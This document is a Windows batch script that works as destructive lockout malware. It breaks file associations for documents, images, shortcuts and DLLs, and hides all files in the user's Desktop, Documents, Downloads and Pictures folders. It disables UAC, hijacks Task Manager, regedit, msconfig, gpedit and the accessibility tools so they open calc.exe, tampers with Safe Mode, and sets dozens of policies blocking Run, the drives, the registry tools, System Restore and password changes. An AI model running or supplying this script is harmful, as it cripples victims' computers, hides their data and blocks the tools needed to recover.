@echo off

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /d "bat.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticetext" /d "xDDD" /f
assoc .lnk=.xDDD
assoc .doc=.xDDD
assoc .xls=.xDDD
assoc .pdf=.xDDD
assoc .jpg=.xDDD
assoc .dll=.xDDD
assoc .mp3=.xDDD
assoc .bmp=.xDDD
attrib +h +s "%USERPROFILE%\Desktop\*" /s /d
attrib +h +s "%USERPROFILE%\Documents\*" /s /d  
attrib +h +s "%USERPROFILE%\Downloads\*" /s /d
attrib +h +s "%USERPROFILE%\Pictures\*" /s /d
bcdedit /deletevalue {current} safeboot >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt" /v HideFileExt /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msinfo32.exe.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\compmgmt.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedt32.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\perfmon.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\perfmon.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mpcmdrun.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskschd.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EaseOfAccessDialog.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "AlternateShell" /t REG_SZ /d "cmd.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoLogoff" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableBootMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoDispScrSavPage" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableMSConfig" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableConfig" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableSR" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableContextMenusInStart" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "HidePowerOptions" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DenyUsersFromMachGP" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoTrayContextMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorcstation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSetTaskbar" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoWinKeys" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoChangingWallPaper" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "StartMenuLogOff" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoCommonGroups" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoClose" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFileMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFolderOptions" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoViewContextMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFind" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoDrives" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoViewOnDrive" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoRun" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSetFolders" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSaveSettings" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoCloseDragDropBands" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartSignOn" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableFirstLogonAnimation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "UndockWithoutLogon" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f



